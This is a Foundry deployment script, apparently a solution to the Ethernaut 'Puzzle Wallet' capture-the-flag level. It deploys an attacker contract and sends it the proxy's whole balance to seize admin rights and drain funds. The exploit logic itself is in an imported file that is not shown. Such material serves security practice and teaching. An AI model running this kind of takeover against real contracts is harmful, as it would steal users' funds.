// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "./PuzzleWallet.sol";
import "./PuzzleWalletAttacker.sol";

contract PuzzleWalletAttackScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address proxyAddress = vm.envAddress("PUZZLE_PROXY_ADDRESS");

        vm.startBroadcast(deployerPrivateKey);

        PuzzleProxy proxy = PuzzleProxy(payable(proxyAddress));
        PuzzleWallet wallet = PuzzleWallet(proxyAddress);

        console.log("=== INITIAL STATE ===");
        console.log("Proxy admin:", proxy.admin());
        console.log("Proxy pendingAdmin:", proxy.pendingAdmin());
        console.log("Wallet owner:", wallet.owner());
        console.log("Wallet maxBalance:", wallet.maxBalance());
        console.log("Contract balance:", address(proxy).balance);

        // Deploy attacker contract
        console.log("\n=== DEPLOYING ATTACKER ===");
        PuzzleWalletAttacker attacker = new PuzzleWalletAttacker(proxyAddress);
        console.log("Attacker deployed at:", address(attacker));

        // Execute attack with exact contract balance
        uint256 contractBalance = address(proxy).balance;
        console.log("\n=== EXECUTING ATTACK ===");
        console.log("Sending:", contractBalance, "wei");
        attacker.attack{value: contractBalance}();

        console.log("\n=== FINAL STATE ===");
        console.log("Proxy admin:", proxy.admin());
        console.log("Contract balance:", address(proxy).balance);

        address player = vm.addr(deployerPrivateKey);
        if (proxy.admin() == player) {
            console.log("\n[SUCCESS] You are now the admin!");
        } else {
            console.log("\n[FAILED] Attack did not succeed");
        }

        vm.stopBroadcast();
    }
}
